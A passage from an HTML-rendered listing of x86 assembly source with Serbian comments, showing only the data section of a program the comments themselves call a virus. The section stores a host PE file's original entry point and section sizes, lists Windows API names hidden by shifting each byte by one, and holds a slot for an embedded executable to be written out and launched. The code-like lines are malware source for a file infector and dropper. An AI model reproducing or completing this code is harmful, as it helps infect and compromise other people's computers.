</span><span class="sc1">; sa drugim podacima, poÑto se stringovi koriste samo na poÅetku programa</span><span class="sc0">


</span><span class="sc5">_data_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;*** Globalni podaci ***</span><span class="sc0">
</span><span class="sc5">_oldEntryPoint</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_oldEntryPointRVA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_oldEPoffs</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_oldfilesize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_oldoffs1</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; veliÅina poslednje sekcija (SizeOfRawData)</span><span class="sc0">
</span><span class="sc5">_olddata1</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_oldoffs2</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; veliÅina poslednje sekcije u DirectoryData (ako postoji!)</span><span class="sc0">
</span><span class="sc5">_olddata2</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_oldoffs3</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; karakteristike poslednje sekcije</span><span class="sc0">
</span><span class="sc5">_olddata3</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_oldoffs4</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; veliÅina poslednje sekcije (VirtualSize)</span><span class="sc0">
</span><span class="sc5">_olddata4</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_oldoffs5</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; SizeofImage</span><span class="sc0">
</span><span class="sc5">_olddata5</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_kript</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;*** Lokalni podaci ***</span><span class="sc0">

</span><span class="sc1">; stringovi: 116 bajtova</span><span class="sc0">
</span><span class="sc5">strKernel</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'W'</span><span class="sc0"> </span><span class="sc1">;db 4Ch                          ; "K"</span><span class="sc0">
</span><span class="sc5">process_information</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">
</span><span class="sc5">cmpname</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; "ERNEL32.DLL", 0  (ujedno i: dd 0, 0, 0, 0)</span><span class="sc0">
</span><span class="sc5">strGetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Fh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">
</span><span class="sc5">startup_info</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">           </span><span class="sc1">; poÅinje sa dwordom 68, a zatim ide joÑ 16 dworda (68 bajta ukupno)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; "GetWindowsDirectoryA", 0</span><span class="sc0">
</span><span class="sc5">strGetComputerNameA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Eh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; "GetComputerNameA", 0</span><span class="sc0">
</span><span class="sc5">strCreateFileA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">                          </span><span class="sc1">; "C"</span><span class="sc0">
</span><span class="sc5">temp</span><span class="sc0">                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">47h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; "reateFileA", 0  (ujedno i: dd 0)</span><span class="sc0">
</span><span class="sc5">strWriteFile</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">47h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; "WriteFile", 0</span><span class="sc0">
</span><span class="sc5">strCloseHandle</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; "CloseHandle", 0</span><span class="sc0">
</span><span class="sc5">strCreateProcessA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; "CreateProcessA", 0</span><span class="sc0">
</span><span class="sc5">strGetProcAddress</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; "GetProcAddress", 0</span><span class="sc0">

</span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;cmpname                    db MAX_COMPUTERNAME_LENGTH dup(0), 0</span><span class="sc0">
</span><span class="sc5">cmpname_len</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">MAX_COMPUTERNAME_LENGTH</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;*** Pointeri na WinAPI f-je ***</span><span class="sc0">
</span><span class="sc1">; u cilju smanjenja duÇine koda ovaj redosled je obavezan!!!!</span><span class="sc0">
</span><span class="sc5">_ddGetModuleHandleA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_ddGetProcAddress</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetProcAddress</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; &lt;- edi</span><span class="sc0">
</span><span class="sc5">ddGetComputerNameA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCreateFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddWriteFile</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCloseHandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCreateProcessA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;*** Ovde Üe se smestiti ceo exe fajl ***</span><span class="sc0">
</span><span class="sc5">_addfile_size</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; ovde ide veliÅina fajla koji je dodat</span><span class="sc0">
</span><span class="sc1">;_virus_data                    ; ovde se nalazi exe fajl koga treba zapisati</span><span class="sc0">
                                </span><span class="sc1">; znaÅi: (&amp;_addfile_size) + sizeof(dd)</span><span class="sc0">

</span><span class="sc5">_virus_end</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; KonaÅno... kraj virusa</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
